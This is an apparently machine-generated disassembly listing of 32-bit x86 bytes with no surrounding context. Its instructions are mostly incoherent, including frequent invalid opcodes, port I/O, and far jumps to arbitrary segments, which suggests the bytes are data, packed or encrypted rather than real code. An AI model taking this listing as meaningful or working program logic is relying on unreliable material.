  41c8ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8af:	mov    DWORD PTR [edi+0x33],eax
  41c8b2:	push   ecx
  41c8b4:	out    0x1d,eax
  41c8b6:	mov    ebx,ebx
  41c8b8:	sahf   
  41c8b9:	call   0x3112e31a
  41c8be:	mov    ds:0x53c694eb,eax
  41c8c3:	add    BYTE PTR [ebx+0x1b26d75f],bh
  41c8c9:	xlat   BYTE PTR ds:[ebx]
  41c8ca:	(bad)  
  41c8cb:	jae    0x41c8c9
  41c8cd:	mov    ah,0x23
  41c8cf:	ficomp DWORD PTR [edi-0x13098b89]
  41c8d5:	xor    bh,BYTE PTR ds:0xaf9a6544
  41c8db:	dec    ebx
  41c8dc:	xchg   esi,eax
  41c8dd:	mov    DWORD PTR [edi+edx*1-0x6b],ebp
  41c8e1:	bound  ebp,QWORD PTR [edx-0x56]
  41c8e4:	and    eax,0xb80183ad
  41c8e9:	jb     0x41c8d9
  41c8eb:	int3   
  41c8ec:	pop    es
  41c8ed:	ret    0x54ef
  41c8f0:	mov    ds:0x881fc59,al
  41c8f5:	loope  0x41c88e
  41c8f7:	dec    edi
  41c8f8:	pusha  
  41c8f9:	sbb    ah,bl
  41c8fb:	cli    
  41c8fc:	cli    
  41c8fd:	and    al,0x20
  41c8ff:	(bad)  
  41c900:	test   al,0xd
  41c902:	es add al,dl
  41c905:	mov    ds:0x1f10124,eax
  41c90a:	add    eax,0xcede9f80
  41c90f:	scas   al,BYTE PTR es:[edi]
  41c910:	out    dx,eax
  41c911:	rol    DWORD PTR [eax-0x34d38a16],cl
  41c917:	jg     0x41c92c
  41c919:	int3   
  41c91a:	push   0xffffffb9
  41c91c:	not    DWORD PTR [edi+0x5af3cabb]
  41c922:	scas   al,BYTE PTR es:[edi]
  41c923:	add    al,0xf3
  41c925:	push   edx
  41c926:	pop    ecx
  41c927:	xchg   esi,eax
  41c928:	xor    ah,BYTE PTR [ebx]
  41c92a:	dec    esi
  41c92b:	dec    esi
  41c92c:	jae    0x41c9a8
  41c92e:	mov    dl,0x76
  41c930:	mov    esp,0x14b658f9
  41c935:	sar    DWORD PTR [ecx],0x2d
  41c938:	dec    edx
  41c939:	out    dx,al
  41c93a:	adc    DWORD PTR [edi-0x16fcdb70],ebp
  41c940:	mov    ebx,esp
  41c942:	addr16 push ebp
  41c944:	dec    esi
  41c945:	add    al,0xb1
  41c947:	add    DWORD PTR [eax+0x36],ebp
  41c94a:	add    al,0xf0
  41c94c:	mov    bh,0x5b
  41c94e:	add    DWORD PTR [eax+edx*1],edx
  41c951:	dec    eax
  41c952:	dec    edi
  41c953:	out    dx,al
  41c954:	adc    eax,0xee6254ff
  41c959:	mov    esi,es
  41c95b:	mov    eax,0x17118e65
  41c960:	sub    dl,BYTE PTR [edx-0x1810c51f]
  41c966:	outs   dx,DWORD PTR ds:[esi]
  41c967:	and    BYTE PTR [ebp+0x2],ch
  41c96a:	adc    DWORD PTR [ecx-0x170b475f],0xc1a34ca4
  41c974:	retf   
  41c975:	out    dx,eax
  41c976:	jle    0x41c984
  41c978:	ds iret 
  41c97a:	bnd jle 0x41c9b7
  41c97d:	in     al,0x8e
  41c97f:	popa   
  41c980:	call   0xc698881f
  41c985:	sub    edx,DWORD PTR [esi-0x56]
  41c988:	dec    ebx
  41c989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c98a:	mov    cs,WORD PTR [ebx]
  41c98c:	jge    0x41c94f
  41c98e:	jg     0x41c986
  41c990:	pop    DWORD PTR ss:[edx+0x68296c3]
  41c997:	jp     0x41c925
  41c999:	fld    DWORD PTR [esi+0xcfba48d]
  41c99f:	inc    edx
  41c9a0:	inc    edx
  41c9a1:	(bad)  
  41c9a2:	jnp    0x41c990
  41c9a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9a5:	add    dh,BYTE PTR ds:0x76bf645e
  41c9ab:	cwde   
  41c9ac:	push   cs
  41c9ad:	xor    eax,0x7b822897
  41c9b2:	test   al,0x24
  41c9b4:	clc    
  41c9b5:	sub    ebx,DWORD PTR [ebp-0x6c11d954]
  41c9bb:	xchg   esi,eax
  41c9bc:	rcl    BYTE PTR ds:0x861351e4,cl
  41c9c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9c3:	fnstsw WORD PTR [eax+0x4c06d45e]
  41c9c9:	push   0x108d7dcc
  41c9ce:	loop   0x41c993
  41c9d0:	repz fdivr st(2),st
  41c9d3:	scas   al,BYTE PTR es:[edi]
  41c9d4:	pop    esi
  41c9d5:	cs mov dh,0x88
  41c9d8:	push   esi
  41c9d9:	dec    edi
  41c9da:	dec    ecx
  41c9db:	aam    0xec
  41c9dd:	test   eax,0xa0440319
  41c9e2:	scas   eax,DWORD PTR es:[edi]
  41c9e3:	sub    DWORD PTR [eax+0x50d7f282],ebx
  41c9e9:	push   ebp
  41c9ea:	push   esp
  41c9eb:	sbb    DWORD PTR [ebp+0x20],esp
  41c9ee:	mov    db6,ebp
  41c9f1:	dec    edx
  41c9f2:	ins    DWORD PTR es:[edi],dx
  41c9f3:	mov    ds:0x30948826,al
  41c9f8:	sbb    esi,DWORD PTR [edx]
  41c9fa:	or     al,0x2a
  41c9fc:	stos   DWORD PTR es:[edi],eax
  41c9fd:	lods   eax,DWORD PTR ds:[esi]
  41c9fe:	and    esi,edi
  41ca00:	inc    ebx
  41ca01:	test   DWORD PTR [ebx+edx*1],ebp
  41ca04:	sub    eax,0x13e26359
  41ca09:	xor    ch,al
  41ca0b:	xor    DWORD PTR ds:0xe74e3d0d,edx
  41ca11:	mov    esp,0x1ff87273
  41ca16:	imul   ebp,DWORD PTR [edx+ebx*1-0x7ca796b5],0x21f59bbe
  41ca21:	cmc    
  41ca22:	je     0x41ca1a
  41ca24:	cs jmp 0x41ca8c
  41ca27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca28:	in     eax,dx
  41ca29:	stos   DWORD PTR es:[edi],eax
  41ca2a:	test   DWORD PTR [eax+0x11],eax
  41ca2d:	pusha  
  41ca2e:	(bad)  
  41ca2f:	ror    BYTE PTR [edx],1
  41ca31:	fs test eax,0xb220a7a4
  41ca37:	xor    ch,0xce
  41ca3a:	mov    WORD PTR [edi],ds
  41ca3c:	sub    BYTE PTR [esi+edi*8+0x5e689ac1],ch
  41ca43:	and    cl,BYTE PTR [eax]
  41ca45:	retf   
  41ca46:	enter  0x1030,0x14
  41ca4a:	shl    bl,1
  41ca4c:	in     eax,0xbe
  41ca4e:	push   esp
  41ca4f:	jg     0x41caa8
  41ca51:	nop
  41ca52:	test   eax,0x141fbbe1
  41ca57:	fdiv   QWORD PTR [ebx-0x71]
  41ca5a:	out    dx,eax
  41ca5b:	retf   
  41ca5c:	adc    eax,esi
  41ca5e:	sub    DWORD PTR [ebx],eax
  41ca60:	mov    eax,0x8e194508
  41ca65:	dec    eax
  41ca66:	fcomp  QWORD PTR [ebp+0x8]
  41ca69:	adc    dl,BYTE PTR es:[edi+0x39]
  41ca6d:	out    dx,al
  41ca6e:	add    BYTE PTR [esi+0x648ac2ce],bl
  41ca74:	lock shl DWORD PTR [esi-0x62],1
  41ca78:	out    0x45,eax
  41ca7a:	and    ch,BYTE PTR [ebp-0x246b682b]
  41ca80:	call   0x87a1143c
  41ca85:	clc    
  41ca86:	cli    
  41ca87:	ins    BYTE PTR es:[edi],dx
  41ca88:	fimul  WORD PTR [esi+0x692fe6c9]
  41ca8e:	add    eax,0x950bc50e
  41ca93:	dec    edi
  41ca95:	push   esi
  41ca96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca97:	rol    BYTE PTR [edx+0x5f],0x20
  41ca9b:	popf   
  41ca9c:	sub    al,BYTE PTR ss:[eax-0x1dd55739]
  41caa3:	in     al,dx
  41caa4:	inc    esp
  41caa5:	es (bad) 
  41caa7:	inc    DWORD PTR [edx]
  41caa9:	mov    dl,0xdd
  41caab:	jns    0xf74cd52d
  41cab1:	push   ecx
  41cab2:	mov    ebx,0x1dcfed20
  41cab7:	and    al,0x71
  41cab9:	(bad)  
  41caba:	jmp    0xb0aa:0x2fb2408b
  41cac1:	xchg   DWORD PTR [ecx],esi
  41cac3:	sub    ecx,edi
  41cac5:	sbb    BYTE PTR [edx+0x2b],0xa8
  41cac9:	add    DWORD PTR [edx+0x3d],edi
  41cacc:	(bad)  
  41cacd:	loope  0x41ca54
  41cacf:	adc    al,0x8d
  41cad1:	aas    
  41cad2:	leave  
  41cad3:	pop    ebx
  41cad4:	paddw  mm4,QWORD PTR [esi]
  41cad7:	js     0x41cab2
  41cad9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cada:	push   cs
  41cadb:	sbb    al,0xd5
  41cadd:	ja     0x41cac4
  41cadf:	popf   
  41cae0:	cmc    
  41cae1:	in     eax,0xb0
  41cae3:	add    ecx,ebx
  41cae5:	enter  0xca4b,0x30
  41cae9:	or     al,0x93
  41caeb:	(bad)  
  41caec:	sub    esi,DWORD PTR [edi+0x194d1e]
  41caf2:	jne    0x41cac7
  41caf4:	lea    ebx,[ecx-0x5a]
  41caf7:	lahf   
  41caf8:	mov    ds:0xd8fc116e,eax
  41cafd:	push   eax
  41cafe:	xor    al,0x78
  41cb00:	add    ecx,DWORD PTR ds:0xf0d2d80d
  41cb06:	cmp    al,0x54
  41cb08:	arpl   WORD PTR [edi],ax
  41cb0a:	mov    ?,WORD PTR [ecx]
  41cb0c:	jmp    0x41caca
  41cb0e:	and    eax,0x1e91e018
  41cb13:	stc    
  41cb14:	xor    DWORD PTR [edx-0x366b1192],esp
  41cb1a:	fimul  DWORD PTR [esi]
  41cb1c:	push   edx
  41cb1d:	pusha  
  41cb1e:	(bad)  
  41cb1f:	inc    ebx
  41cb20:	div    ch
  41cb22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb23:	push   ebx
  41cb24:	mov    cl,0x28
  41cb26:	fsubr  DWORD PTR [eax+ecx*8+0x13]
  41cb2a:	add    bh,dh
  41cb2c:	add    ebp,DWORD PTR [edx]
  41cb2e:	mov    eax,DWORD PTR [edi]
  41cb30:	ds call 0x6908:0x2644e3b6
  41cb38:	retf   0xf058
  41cb3b:	sbb    ebp,DWORD PTR [ecx+0x58]
  41cb3e:	mov    ds:0x879c3b25,al
  41cb43:	jne    0x41cbc4
  41cb45:	sub    eax,0xb4346750
  41cb4a:	mov    esi,0x3d66df6
  41cb4f:	pusha  
  41cb50:	loop   0x41cbc0
  41cb52:	mov    ch,0x34
  41cb54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb56:	inc    edx
  41cb57:	stc    
  41cb58:	fst    st(1)
  41cb5a:	hlt    
  41cb5b:	repnz (bad) 
  41cb5d:	nop
  41cb5e:	mov    edi,0xc290d493
  41cb63:	in     eax,0x5e
  41cb65:	(bad)  
  41cb66:	pusha  
  41cb67:	mov    edi,0x93b92097
  41cb6c:	sbb    al,0xa
  41cb6e:	sbb    DWORD PTR [ebp-0x73],edi
  41cb71:	test   al,0xd3
  41cb73:	mov    dh,BYTE PTR [ecx]
  41cb75:	std    
  41cb76:	ss cmp al,0xb
  41cb79:	fsub   st,st(7)
  41cb7b:	or     BYTE PTR [ecx],al
  41cb7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb7e:	(bad)  
  41cb7f:	mov    ch,0xb3
  41cb81:	int3   
  41cb82:	rol    BYTE PTR [esi-0x5b],0xe
  41cb86:	retf   0x96f9
  41cb89:	cmp    dl,ch
  41cb8b:	ret    0x8b8c
  41cb8e:	test   al,0xda
  41cb90:	enter  0x2629,0x3
  41cb94:	inc    esp
  41cb95:	cwde   
  41cb96:	mov    edx,0x3df82a8
  41cb9b:	cwde   
  41cb9c:	fidivr DWORD PTR [ebx+eax*2+0x4dc76524]
  41cba3:	inc    ebx
  41cba4:	shr    BYTE PTR [esi],cl
  41cba6:	pop    ebp
  41cba7:	dec    esi
  41cba8:	mov    esp,0x9526f0b1
  41cbad:	or     al,0xd6
  41cbaf:	and    BYTE PTR [ebx],bl
  41cbb1:	xchg   ebx,eax
  41cbb2:	inc    edx
  41cbb3:	cs adc ebp,ebx
  41cbb6:	cdq    
  41cbb7:	jne    0x41cb92
  41cbb9:	std    
  41cbba:	(bad)  [ecx]
  41cbbc:	push   esp
  41cbbd:	lea    ebp,[edx-0x1d]
  41cbc0:	das    
  41cbc1:	in     eax,dx
  41cbc2:	sbb    eax,DWORD PTR [edx+0x1cdf4541]
  41cbc8:	fist   WORD PTR [esi+0x32]
  41cbcb:	pop    ecx
  41cbcc:	aad    0x83
  41cbce:	xchg   BYTE PTR [ebx+eiz*4],dh
  41cbd1:	xchg   bl,ah
  41cbd3:	jnp    0x41cc01
  41cbd5:	push   es
  41cbd6:	stc    
  41cbd7:	repnz fnstsw WORD PTR [esi*2+0x499ba854]
  41cbdf:	inc    edx
  41cbe0:	mov    ch,0xf3
  41cbe2:	out    dx,al
  41cbe3:	xlat   BYTE PTR ds:[ebx]
  41cbe4:	jne    0x41cb7e
  41cbe6:	push   ss
  41cbe7:	xchg   ebp,eax
  41cbe8:	pop    ebp
  41cbe9:	jl     0x41cbe0
  41cbeb:	mov    ?,edx
  41cbed:	sbb    al,0x92
  41cbef:	stos   DWORD PTR es:[edi],eax
  41cbf0:	or     esi,eax
  41cbf2:	pop    es
  41cbf3:	outs   dx,DWORD PTR ds:[esi]
  41cbf4:	add    dh,0x73
  41cbf7:	push   edi
  41cbf8:	mov    ebp,0x237a9391
  41cbfd:	fdivr  st,st(1)
  41cbff:	xchg   ebp,eax
  41cc00:	stos   DWORD PTR es:[edi],eax
  41cc01:	dec    ebp
  41cc02:	fldcw  WORD PTR [edi+ebx*4+0x28a8e773]
  41cc09:	popa   
  41cc0a:	jmp    0x41cc30
  41cc0c:	ss enter 0x8b0a,0xce
  41cc11:	fld    TBYTE PTR [edi]
  41cc13:	mov    edi,0x8e5f8ffa
  41cc18:	mov    ds:0xcc9b026a,eax
  41cc1d:	gs push 0x42
  41cc20:	sbb    eax,0x1787ec7a
  41cc25:	adc    eax,0xb12aad6e
  41cc2a:	jp     0x41cc19
  41cc2c:	ss mov esi,0x94b7f181
  41cc32:	or     cl,al
  41cc34:	push   ds
  41cc35:	xchg   edx,eax
  41cc36:	sbb    edi,DWORD PTR [esi-0x3f]
  41cc39:	pop    edi
  41cc3a:	pop    es
  41cc3b:	jg     0x41cbf0
  41cc3d:	gs jnp 0x41ccae
  41cc40:	adc    bl,dh
  41cc42:	je     0x41ccbb
  41cc44:	cld    
  41cc45:	retf   0x25b0
  41cc48:	jp     0x41cbde
  41cc4a:	sub    al,0x1f
  41cc4c:	rcr    BYTE PTR [ebx],1
  41cc4e:	daa    
  41cc4f:	jle    0x41cbdf
  41cc51:	adc    DWORD PTR [eax],esp
  41cc53:	call   0xc19b:0x371ac60a
  41cc5a:	sbb    ecx,DWORD PTR [esi]
  41cc5c:	(bad)  
  41cc5e:	loopne 0x41cc45
  41cc60:	ja     0x41ccb5
  41cc62:	cmc    
  41cc63:	push   ss
  41cc64:	repnz push ebx
  41cc66:	jmp    0xa6bd:0x25fb630b
  41cc6d:	mul    BYTE PTR [esi]
  41cc6f:	or     eax,0xa8940f6d
  41cc74:	shr    DWORD PTR [esi],cl
  41cc76:	imul   edx,DWORD PTR [edi+0x268ac74e],0x10cc4dd2
  41cc80:	enter  0xee64,0x18
  41cc84:	repnz daa 
  41cc86:	and    DWORD PTR [ebp-0x43],eax
  41cc89:	inc    edx
  41cc8a:	call   0x793b:0xa854946f
  41cc91:	cmp    al,0xe8
  41cc93:	test   BYTE PTR [edi],ah
  41cc95:	mov    ebx,0x7579e279
  41cc9a:	(bad)  
  41cc9b:	push   edi
  41cc9c:	fxch   st(6)
  41cc9e:	and    eax,esi
  41cca0:	ja     0x41cc9e
  41cca2:	pop    ebx
  41cca3:	ror    BYTE PTR [ebp-0x7],1
  41cca6:	ss stos BYTE PTR es:[edi],al
  41cca8:	inc    edx
  41cca9:	popa   
  41ccaa:	rol    BYTE PTR [edi],cl
  41ccac:	xchg   DWORD PTR [esi+0x73],ebp
  41ccaf:	or     ah,BYTE PTR [ecx+ebp*2]
  41ccb2:	push   edx
  41ccb3:	mov    ah,0x7d
  41ccb5:	data16 lods al,BYTE PTR ds:[esi]
  41ccb7:	lods   eax,DWORD PTR ds:[esi]
  41ccb8:	adc    al,ch
  41ccba:	and    eax,0xd2f283cb
  41ccbf:	dec    eax
  41ccc0:	cmp    esi,DWORD PTR [ebx+eiz*8+0x17f4bb14]
  41ccc7:	pop    edx
  41ccc8:	cs and al,0xf4
  41cccb:	or     eax,0x85b3de23
  41ccd0:	xor    al,0x59
  41ccd2:	call   FWORD PTR [ecx]
  41ccd4:	scas   al,BYTE PTR es:[edi]
  41ccd5:	(bad)  
  41ccd6:	and    BYTE PTR [esi+0x4d],dl
  41ccd9:	scas   al,BYTE PTR es:[edi]
  41ccda:	nop
  41ccdb:	inc    edx
  41ccdc:	xchg   ebp,ebx
  41ccde:	jmp    FWORD PTR [esi]
  41cce0:	dec    esp
  41cce1:	loop   0x41cd00
  41cce3:	xchg   edi,eax
  41cce4:	lods   eax,DWORD PTR ds:[esi]
  41cce5:	pop    ss
  41cce6:	jg     0x41cccb
  41cce8:	jg     0x41ccbe
  41ccea:	jo     0x41ccca
  41ccec:	popf   
  41cced:	repz rcl BYTE PTR es:[esi],cl
  41ccf1:	xchg   BYTE PTR [ecx+0x41],ah
  41ccf4:	cmp    ebp,DWORD PTR [ebp-0x6d41fab8]
  41ccfa:	xchg   esp,esp
  41ccfc:	dec    esi
  41ccfd:	push   DWORD PTR [edx+0x4da5e24c]
  41cd03:	add    eax,0x296d2dfd
  41cd08:	mov    cl,0xd8
  41cd0a:	into   
  41cd0b:	arpl   WORD PTR [eax-0x4d],cx
  41cd0e:	les    edx,FWORD PTR [esi]
  41cd10:	addr16 int 0x7f
  41cd13:	or     eax,0xd6d5f521
  41cd18:	xor    BYTE PTR [ecx],cl
  41cd1a:	mov    al,0x9c
  41cd1c:	add    eax,0x6d19651f
  41cd21:	bound  ecx,QWORD PTR [esi-0x7f44494b]
  41cd27:	pushf  
  41cd28:	test   DWORD PTR [ecx-0x20],edi
  41cd2b:	push   ebp
  41cd2c:	jo     0x41cd6e
  41cd2e:	sbb    ebp,DWORD PTR ds:[edi]
  41cd31:	dec    eax
  41cd32:	aas    
  41cd33:	fucomip st,st(0)
  41cd35:	sub    BYTE PTR [eax+0x3c],bh
  41cd38:	(bad)  
  41cd3a:	dec    ecx
  41cd3b:	or     al,0xf1
  41cd3d:	scas   al,BYTE PTR es:[edi]
  41cd3e:	sahf   
  41cd3f:	out    dx,al
  41cd40:	lahf   
  41cd41:	shr    DWORD PTR ds:0xbc069ad7,0xcc
  41cd48:	popf   
  41cd49:	mov    ds:0x625a6456,al
  41cd4e:	sahf   
  41cd4f:	jne    0x41cceb
  41cd51:	ror    esp,0x9b
  41cd54:	mov    edx,0x67af1d5f
  41cd59:	xor    eax,0x26988cc
  41cd5e:	push   ebp
  41cd5f:	lea    esp,[edi+0x45]
  41cd62:	rol    DWORD PTR [eax],0xbc
  41cd65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd66:	jecxz  0x41cda7
  41cd68:	fcom   QWORD PTR [eax-0x47]
  41cd6b:	fidivr DWORD PTR [esi+0xd]
  41cd6e:	mov    al,ds:0x177b4714
  41cd73:	jnp    0x41cdd6
  41cd75:	mov    esi,0xc96ba1ec
  41cd7a:	dec    esi
  41cd7b:	and    ebx,DWORD PTR [ebp+0x3b681dad]
  41cd81:	out    dx,al
  41cd82:	popa   
  41cd83:	loopne 0x41cdfe
  41cd85:	adc    edi,DWORD PTR [ecx+0x2f]
  41cd88:	sti    
  41cd89:	ins    BYTE PTR es:[edi],dx
  41cd8a:	mov    WORD PTR [esi+eiz*2+0x1f78bf93],ss
  41cd91:	xor    dl,cl
  41cd93:	xlat   BYTE PTR ds:[ebx]
  41cd94:	dec    ebp
  41cd95:	mov    WORD PTR [edi],ds
  41cd97:	out    0xaa,eax
  41cd99:	imul   ebp,DWORD PTR [edi+eiz*1-0x77d80279],0xffffffa3
  41cda1:	mov    al,bl
  41cda3:	fmul   DWORD PTR [edi+0x1a]
  41cda6:	fld    TBYTE PTR [edi+edx*8+0x58]
  41cdaa:	jl     0x41ce06
  41cdac:	pop    esi
  41cdad:	jne    0x41cd53
  41cdaf:	cwde   
  41cdb0:	das    
  41cdb1:	adc    bh,BYTE PTR [ebx-0x5a7d283c]
  41cdb7:	mov    edi,DWORD PTR [esi+eiz*1]
  41cdba:	push   0xd7d3b8bc
  41cdbf:	gs icebp 
  41cdc1:	sub    edx,DWORD PTR [esi+0x23589d56]
  41cdc7:	pop    ebx
  41cdc8:	cmp    ah,BYTE PTR [edx-0x1]
  41cdcb:	cld    
  41cdcc:	jae    0x41cdfb
  41cdce:	sar    BYTE PTR [eax],cl
  41cdd0:	sahf   
  41cdd1:	(bad)  
  41cdd2:	jmp    0x317:0x37b5eb43
  41cdd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdda:	push   ecx
  41cddb:	(bad)  [ecx+0x13]
  41cdde:	dec    ecx
  41cddf:	(bad)  
  41cde0:	jnp    0x41cdc3
  41cde2:	xchg   DWORD PTR [ebp-0x1186e1dc],edi
  41cde8:	pop    eax
  41cde9:	popa   
  41cdea:	les    ebp,FWORD PTR [eax+0x79]
  41cded:	ror    DWORD PTR [edx+edx*4-0x38],0x20
  41cdf2:	lock adc DWORD PTR [eax],esi
  41cdf5:	dec    edi
  41cdf6:	mov    eax,ds:0x49b016dc
  41cdfb:	cmp    BYTE PTR [edx],ch
  41cdfd:	(bad)  
  41cdfe:	xlat   BYTE PTR ds:[ebx]
  41cdff:	test   al,0x67
  41ce01:	out    dx,eax
  41ce02:	fstp   QWORD PTR [esi+0x21]
  41ce05:	sbb    ebp,DWORD PTR [edi+0x76]
  41ce08:	xchg   ecx,eax
  41ce09:	xor    al,0xf7
  41ce0b:	ret    
  41ce0c:	sbb    bh,bh
  41ce0e:	push   edx
  41ce0f:	test   BYTE PTR [ecx+0x55],dh
  41ce12:	push   ecx
  41ce13:	adc    bh,ah
  41ce15:	daa    
  41ce16:	stos   DWORD PTR es:[edi],eax
  41ce17:	sbb    ecx,DWORD PTR [esi+0x36bf2ee5]
  41ce1d:	mov    ds:0xbc5ef8d6,al
  41ce22:	ins    DWORD PTR es:[edi],dx
  41ce23:	fmul   st,st(5)
  41ce25:	les    ebp,FWORD PTR [ecx-0x4]
  41ce28:	pop    DWORD PTR [edx]
  41ce2a:	cmp    BYTE PTR [edx+eiz*2-0x79],cl
  41ce2e:	push   ebp
  41ce2f:	loop   0x41ce51
  41ce31:	mov    al,ds:0xd2fda6a
  41ce36:	(bad)  
  41ce37:	mov    eax,0xdfe65534
  41ce3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce3d:	jnp    0x41ce16
  41ce3f:	rcr    ecx,1
  41ce41:	arpl   WORD PTR es:[edx-0x7c],sp
  41ce45:	and    esp,DWORD PTR [ebx+ebp*2]
  41ce48:	(bad)  
  41ce4a:	sbb    eax,0x96d6f8b
  41ce4f:	es int 0x22
  41ce52:	call   DWORD PTR [ebx]
  41ce54:	aad    0x89
  41ce56:	call   0xecafee4a
  41ce5b:	and    al,0x86
  41ce5d:	xor    BYTE PTR [edi-0x43c20e9c],bl
  41ce63:	cmp    cl,bl
  41ce65:	mov    ebx,0x9a8701d1
  41ce6a:	add    al,0x8e
  41ce6c:	fs mov edx,0x2b99099d
  41ce72:	push   ebx
  41ce73:	xor    BYTE PTR [edi+ebp*1-0x54],bh
  41ce77:	dec    DWORD PTR [edx+0x6eca6f09]
  41ce7d:	inc    edx
  41ce7e:	sub    al,0xfc
  41ce80:	mov    dl,BYTE PTR [edi+0x43]
  41ce83:	fnstsw WORD PTR [ebp-0x2a]
  41ce86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce87:	aam    0x12
  41ce89:	cmp    ecx,DWORD PTR [edx-0x45]
  41ce8c:	dec    ebp
  41ce8d:	adc    eax,0xaddc5d2a
  41ce92:	adc    al,BYTE PTR [ebx+0x3]
  41ce95:	mov    es,WORD PTR [edx+eiz*4-0x59]
  41ce99:	in     al,0xa8
  41ce9b:	sbb    eax,0xbbe6d406
  41cea0:	out    dx,eax
  41cea1:	das    
  41cea2:	bound  ebx,QWORD PTR [edi]
  41cea4:	jne    0x41ce8b
  41cea6:	and    DWORD PTR [ecx],ecx
  41cea8:	enter  0xa9eb,0xca
  41ceac:	xor    al,0x9b
  41ceae:	ret    
  41ceaf:	adc    bl,al
  41ceb1:	aas    
  41ceb2:	loope  0x41ce65
  41ceb4:	nop
  41ceb5:	inc    ecx
  41ceb6:	sub    edi,edi
  41ceb8:	sub    al,0x0
  41ceba:	mov    dh,0x38
  41cebc:	jae    0x41cf14
  41cebe:	fldcw  WORD PTR [ebx]
  41cec0:	jae    0x41ce4a
  41cec2:	fs xchg esp,eax
  41cec5:	push   ds
  41cec6:	data16 jnp 0x41ce54
  41cec9:	dec    edi
  41ceca:	mov    esp,0x8b492cc1
  41cecf:	stc    
  41ced0:	fcmovnb st,st(3)
  41ced2:	das    
  41ced3:	dec    esi
  41ced4:	cmp    bh,bl
  41ced6:	rcl    bl,1
  41ced8:	jmp    0x87719505
  41cedd:	mov    ebp,0x2f9aef0f
  41cee2:	mov    dl,0xeb
  41cee4:	mov    bh,0x91
  41cee6:	loopne 0x41ce8b
  41cee8:	in     al,dx
  41cee9:	(bad)  
  41ceea:	gs loop 0x41ce9a
  41ceed:	cld    
  41ceee:	ret    0x1e8e
  41cef1:	ss and edx,ebp
  41cef4:	push   ecx
  41cef5:	adc    BYTE PTR [eax],dh
  41cef7:	dec    edi
  41cef8:	adc    ch,BYTE PTR [edi-0x7cd4e9ca]
  41cefe:	mov    ch,0xc
  41cf00:	cmp    eax,0x47ac1dd2
  41cf05:	movd   edx,mm5
  41cf08:	mov    eax,ds:0x4c2076e9
  41cf0d:	xchg   esi,eax
  41cf0e:	out    dx,al
  41cf0f:	mov    eax,ds:0x8f3dee2f
  41cf14:	lock cmp BYTE PTR [edx+0x30],ch
  41cf18:	jns    0x41cf3a
  41cf1a:	std    
  41cf1b:	fwait
  41cf1c:	mov    edi,0x4521d4fa
  41cf21:	xchg   DWORD PTR [esi-0x2722ea14],ecx
  41cf27:	push   es
  41cf28:	dec    edi
  41cf29:	call   0xb182:0xe7c2d5f9
  41cf30:	dec    eax
  41cf31:	lock and al,0xcb
  41cf34:	(bad)  
  41cf35:	pop    ebp
  41cf36:	das    
  41cf37:	mov    eax,ds:0x89341ce6
  41cf3c:	mov    al,ds:0xbd3bd535
  41cf41:	jge    0x41cf94
  41cf43:	mov    edi,0x89f7ee01
  41cf48:	xchg   BYTE PTR [edi+ecx*2],bh
  41cf4b:	(bad)  
  41cf4c:	test   eax,0x3ed44927
  41cf51:	aam    0x4d
  41cf53:	mov    ?,WORD PTR [edx]
  41cf55:	add    eax,0x62a156e
  41cf5a:	and    DWORD PTR [ecx],esp
  41cf5c:	or     eax,0x28
  41cf5f:	jmp    0xa7be:0x16119fa4
  41cf66:	sub    ebx,DWORD PTR [edx+0x3a]
  41cf69:	mov    ah,al
  41cf6b:	fwait
  41cf6c:	cmc    
  41cf6d:	jnp    0x41cfd3
  41cf6f:	pusha  
  41cf70:	jg     0x41cf78
  41cf72:	ret    
  41cf73:	dec    DWORD PTR [ecx-0x5af02dce]
  41cf79:	scas   al,BYTE PTR es:[edi]
  41cf7a:	push   edx
  41cf7b:	bound  esi,QWORD PTR [edi+0x6bbbe231]
  41cf81:	popa   
  41cf82:	pop    edi
  41cf83:	cmp    BYTE PTR [edx-0x6a],cl
  41cf86:	popf   
  41cf87:	and    esp,DWORD PTR [eax-0x27]
  41cf8a:	stos   BYTE PTR es:[edi],al
  41cf8b:	mov    dh,0x56
  41cf8d:	add    eax,0x4b298a8e
  41cf92:	popa   
  41cf93:	mov    dh,BYTE PTR [esi]
  41cf95:	and    al,0xa8
  41cf97:	mov    dh,bh
  41cf99:	jno    0x41d006
  41cf9b:	xor    dl,0xee
  41cf9e:	sbb    BYTE PTR [edi+0xd],dl
  41cfa1:	sar    DWORD PTR [eax],1
  41cfa3:	mov    ebp,0xca3776d7
  41cfa8:	lods   al,BYTE PTR ds:[esi]
  41cfa9:	mov    edx,0xe8f4ff1e
  41cfae:	mov    ecx,0xce263521
  41cfb3:	sahf   
  41cfb4:	xchg   bx,ax
  41cfb6:	in     eax,0x28
  41cfb8:	loopne 0x41d017
  41cfba:	fldcw  WORD PTR [ebx]
  41cfbc:	mov    bh,0xdc
  41cfbe:	xchg   esi,eax
  41cfbf:	xor    BYTE PTR [edi-0x38],bh
  41cfc2:	xchg   edx,eax
  41cfc3:	cmp    BYTE PTR [edx+0x4f9c1d18],bl
  41cfc9:	add    al,0x30
  41cfcb:	push   esi
  41cfcc:	(bad)  
  41cfcd:	pop    edi
  41cfce:	sbb    al,0x92
  41cfd0:	push   cs
  41cfd1:	inc    edx
  41cfd2:	push   ecx
  41cfd3:	jecxz  0x41cfb4
  41cfd5:	iret   
  41cfd6:	mov    esi,0xce1122
  41cfdb:	add    al,0x27
  41cfdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfde:	sbb    BYTE PTR [esi-0x762b2379],ah
  41cfe4:	xchg   ebx,eax
  41cfe5:	or     al,BYTE PTR [ebx]
